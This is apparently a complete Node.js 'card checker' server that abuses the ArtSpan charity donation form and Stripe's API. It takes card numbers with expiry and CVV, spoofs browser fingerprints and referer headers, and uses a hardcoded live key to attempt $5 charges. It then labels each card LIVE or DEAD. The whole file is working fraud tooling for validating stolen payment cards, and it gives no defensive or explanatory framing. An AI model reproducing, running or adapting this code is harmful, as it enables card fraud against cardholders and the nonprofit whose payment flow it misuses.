const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json());

const ARTPAN_PK = 'pk_live_51QVIZEBQDKIMdEl0TH6zoYwCH8E5Q1XyxJ73HNSqz7kWQUDPelsHHplSQnRUDzQGkoC2PtEqKqhgT9pkltge0jaB00C63zAYQm';
const ARTPAN_API = 'https://us-central1-artspanapp.cloudfunctions.net/createPaymentIntent';

// IDs to mimic real browser fingerprints
const genID = () => 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) => {
    const r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
});

app.get('/', (req, res) => res.send('ArtSpan Bypass API Active 🟢'));

app.get('/chk', async (req, res) => {
    const { card } = req.query;
    if (!card) return res.send('❌ Usage: /chk?card=num|mm|yyyy|cvv');

    const [num, mon, year, cvv] = card.split('|').map(i => i.trim());
    const fullYear = year.length === 2 ? `20${year}` : year;

    try {
        // STEP 1: Get Secret (The Donation Form initialization)
        const intentRes = await axios.post(ARTPAN_API, {
            amount: 500, // $5.00 looks more like a real donation than $1.00
            email: `donor${Math.floor(Math.random()*1000)}@gmail.com`,
            live: true
        });
        const secret = intentRes.data.clientSecret;
        const pi_id = secret.split('_secret')[0];

        // STEP 2: Create Payment Method (The "Surface" Bypass)
        // We hit the payment_methods endpoint with authorized referers
        const pmRes = await axios.post('https://api.stripe.com/v1/payment_methods', 
            new URLSearchParams({
                'type': 'card',
                'card[number]': num,
                'card[cvc]': cvv,
                'card[exp_month]': parseInt(mon),
                'card[exp_year]': parseInt(fullYear),
                'key': ARTPAN_PK,
                'guid': genID(),
                'muid': genID(),
                'sid': genID(),
                'payment_user_agent': 'stripe.js/83a1f53796; stripe-js-v3/83a1f53796'
            }).toString(),
            {
                headers: {
                    'Origin': 'https://js.stripe.com',
                    'Referer': 'https://www.artspan.org/', 
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0'
                }
            }
        ).catch(e => e.response);

        if (pmRes.data.error) {
            return res.send(`<h2>❌ Surface Error</h2><p>${pmRes.data.error.message}</p>`);
        }

        const pm_id = pmRes.data.id;

        // STEP 3: Confirm (The "Final Click")
        const confirmRes = await axios.post(`https://api.stripe.com/v1/payment_intents/${pi_id}/confirm`, 
            new URLSearchParams({
                'payment_method': pm_id,
                'client_secret': secret,
                'key': ARTPAN_PK
            }).toString(),
            {
                headers: {
                    'Origin': 'https://www.artspan.org',
                    'Referer': 'https://www.artspan.org/'
                }
            }
        ).catch(e => e.response);

        // Result Logic
        const data = confirmRes.data;
        const isLive = data.status === 'succeeded' || (data.error && data.error.decline_code === 'insufficient_funds');

        res.send(`
            <div style="font-family:sans-serif; text-align:center; margin-top:50px;">
                <h1 style="color:${isLive ? 'green' : 'red'};">${isLive ? '✅ LIVE' : '❌ DEAD'}</h1>
                <p><b>Msg:</b> ${data.error ? data.error.message : 'Success'}</p>
                <p><b>Code:</b> ${data.error ? (data.error.decline_code || 'generic_decline') : 'success'}</p>
            </div>
        `);

    } catch (err) {
        res.status(500).send(`Error: ${err.message}`);
    }
});

app.listen(PORT, '0.0.0.0', () => console.log(`Server live on ${PORT}`));
